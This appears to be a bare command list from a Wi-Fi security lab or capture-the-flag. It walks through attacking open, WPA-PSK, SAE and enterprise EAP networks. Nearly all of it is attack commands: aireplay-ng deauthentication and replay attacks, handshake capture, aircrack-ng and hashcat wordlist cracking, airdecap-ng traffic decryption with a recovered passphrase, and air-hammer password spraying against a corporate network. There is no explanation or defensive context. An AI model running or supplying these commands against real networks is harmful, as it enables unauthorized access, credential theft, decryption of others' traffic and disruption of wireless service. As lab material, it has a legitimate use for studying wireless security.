...
```
wpa_supplicant -i wlan2 -c opn.conf
dhclient -v wlan2
...
sudo aireplay-ng -1 0 -a F0:9F:C2:71:22:11 -c 3E:C8:44:0A:24:BA wlan0mon
sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 3E:C8:44:0A:24:BA wlan0mon
...
airodump-ng wlan0mon --band abg -c 6 --wps -w psk
aireplay-ng -0 1 -a F0:9F:C2:71:22:12 wlan0mon
aircrack-ng psk-01.cap -w rockyou-top100000.txt

## decrypting WPA-PSK packets
airdecap-ng -e wifi-mobile -p starwars1 ~/psk.cap
wireshark ~/psk-dec.cap
...
```
wpa_supplicant -i wlan2 -c psk.conf
dhclient wlan2 -v
...
airodump-ng wlan0mon -c 11 -w saepsk
cat saepsk01.csv 
...
aireplay-ng wlan0mon -0 1 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
hashcat -m 22000 hostapd.hccapx ~/rockyou-top100000.txt --force
...
```
wpa_supplicant -i wlan2 -c saepsk.conf
dhclient wlan2 -v

# EAP
## wifi_db
python3 wifi_db.py ~/wifireg-01.cap -d db.SQLITE 
...
python2 ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt
...
```
wpa_supplicant -i wlan2 -c EAP.conf
dhclient wlan2 -v
...
iwconfig wlan0mon channel 44
aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:07:6C:40
